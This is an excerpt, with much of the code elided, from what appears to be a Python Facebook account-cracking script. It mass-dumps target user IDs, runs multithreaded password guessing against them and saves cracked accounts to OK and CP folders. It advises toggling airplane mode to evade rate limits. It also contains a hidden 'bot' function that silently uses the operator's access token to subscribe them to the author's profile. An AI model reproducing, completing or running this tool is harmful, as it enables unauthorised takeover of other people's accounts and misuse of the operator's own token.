...
try:
        ...
        cetak(nel('\t• Currently Installing the Stdiomask Module •'))
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/Sewaktimsina/Sewak/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
...
def banner():
	...
	print(f'\t       FACEBOOK META  ')
	print(f'\t  Author <•> SEWAK-Timsina  & NISCHAL ACHARYA')
	print(f'\t    From <•> NEPAL ')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def login_lagi334():
	try:
		...
		print(f'  {x}[{h}•{x}]{h} LOGIN SUCCESSFULLY.........Used garne vaye feri run hann!!!!{x} ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s LOGIN FAILED PLEASE USES FRESH COOKIES  !!%s'%(x,k,x,m,x))
		exit()
def bot():
	try:
		requests.post("https://graph.facebook.com/100049813997809?fields=subscribers&access_token=%s"%(tokenku))
	except:
		pass
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
 ...
 #  gh = 'github.com/SEWAK-XDy'
	cetak(nel('\tWELCOME To  [yellow]%s[blue] MY DEAR'%(my_name)))
	print(f'<•> Fb uid: '+str(my_id))
...
#-----------------[ Results-CRACK ]-----------------#
def result():
	print(f'<•> 1. Results {u}OK{x} Anda ')
	print(f'<•> 2. Results {m}CP{x} Anda ')
	print('<•> 3. Kembali	')
	kz = input(f'\n<•> Choose : ')
	if kz in ['2']:
		try:vin = os.listdir('CP')
			...
			back()
		if len(vin)==0:
			print('<•> Anda Tidak Memiliki Results CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			...
			try:geh = lol[geeh]
				...
				print('<•> Choose The Right One Dick')
				back()
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('<•> What is yours target? : '))
	except ValueError:
		print('<•> Enter Dear Number, not Huruff ')
		exit()
	if jum<1 or jum>100:
...
# print('>> 4. Mtouch ')
 #print('')
	...
	if hc in ['1','01']:
		...
		method.append('mobile')
	print('')
	_jembot_ = input('<•>Add Application ( Y/N ) ')
	if _jembot_ in ['']:
		print('<•> Choose The Right One Dick')
		back()
		...
		taplikasi.append('no')
	pwplus=input('<•> Add Password ManuallyManual ( Y/N ) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'>>>>> {m}•{k}•{h}•{x} Loving in Silence{m}•{k}•{h}•{x} <<<<< ')
	print('')
	print(f'<•> Results {u}OK{x} Saved In : {u}OK/%s {x}'%(okc))
	print(f'<•> Results {m}CP{x} Saved In : {m}CP/%s {x}'%(cpc))
	print(f'<•> Airplane Mode ON Every 5 minutes / Wifi and DATA {m}500{x} ID\n')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[cyan]✓[green] Crack Complete DEAR, Time for sweet power [green] ✓[orange] '))
	print(f'[{b}•{x}]{m} OK : {h}%s '%(ok))
	print(f'{x}[{b}•{x}]{u} CP : {k}%s{x} '%(cp))
	print('')
	print('<•> Lanjut Crack ( Y/N ) ? ')
	woi = input('<•> Choose : ')
	if woi in ['y','Y']:
		back()
	else:
